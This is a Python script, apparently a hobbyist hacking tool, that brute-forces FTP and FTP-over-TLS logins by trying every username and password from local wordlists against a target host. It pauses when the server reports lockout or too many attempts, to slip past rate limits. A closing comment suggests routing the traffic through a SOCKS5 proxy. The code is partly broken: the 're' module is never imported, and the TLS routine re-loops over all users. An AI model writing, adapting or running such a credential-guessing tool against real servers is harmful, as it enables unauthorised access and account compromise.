#from socket import * # NOT NEEDED.
import ftplib,time,sys

def ftp_TLS_brute_force(host,user,passw):#function 2
    global totalfails,totalusers
    for num in range(0,totalusers):
        user = listofusers[num]
        user = user.strip()
        for passw in listofpassw:
            passw = passw.strip()
            try:
                tlsisntance = ftplib.FTP_TLS(host) #the main difference on the definition from the "function1" is this line, I use FTP_TLS to call the tls protocol
                tlsisntance.login(user,passw)
                print ('[>]Found match '+user+':'+passw)
                sys.exit(0)
            except Exception as e:
                estg = str(e)
                totalfails = 1 + totalfails
                if re.search('Maximum|Reached|Attempts',estg,flags=re.I) is not None:
                    time.sleep(600)
                    totalfails = 0
                if totalfails == 10:
                    time.sleep(240)
                    totalfails = 0
                print (user+':'+passw+' did not match')

def ftp_bruteforce(user,passw): #function 1 
    global totalfails
    try:
        instance.login(user,passw)
        print ('[>]Found match'+user+':'+passw)
        sys.exit(0) #if no errors found, match found ! 
    except Exception as e: #Exception,e : in py 2.7
        estg = str(e)
        totalfails = 1+totalfails 
        if re.search('Maximum|Reached|Attempts',estg,flags=re.I) is not None: #if the error code has one of that words, the script stops for 600 sec
            time.sleep(600)
            totalfails = 0
        if totalfails == 10:#if var totalfails == 10 , stops for 120sec
            time.sleep(120)
            totalfails = 0
        if re.search('Tls|Auth',estg,flags=re.I) is not None: #if the script as one of this words I need to make a login with the TLS protocol 
            print ('[!]TLS detected') 
            ftp_TLS_brute_force(host,user,passw) #call TLS function 
        print ('[!]'+user+':'+passw+' did not match')

def main(): # main functu
    global instance,host,listofusers,listofpassw,totalusers,totalfails
    totalfails = 0
    totalusers = 0
    host = "IP of the FTP server "
    instance = ftplib.FTP(host)
    usersfile = open('users')
    passfile = open('passwords')
    listofusers = []
    listofpassw = []
    for line in usersfile.readlines():
        line = line.strip() # I append the users to a list, it will be easier to itenerate later
        listofusers.append(line)
    for line in passfile.readlines():
        line = line.strip()# same thing here as for the users
        listofpassw.append(line)
    for line in listofusers:
        totalusers = 1 + totalusers
    for num in range(0,totalusers): #totalusers = total number of users in the list.
        user = listofusers[num]
        for passw in listofpassw: #will try every passw on the listofpassw, with one user at a time
            ftp_bruteforce(user,passw) #call the function

main() #define a ftp host 


#try proxy socks5 : in order to use proxy 
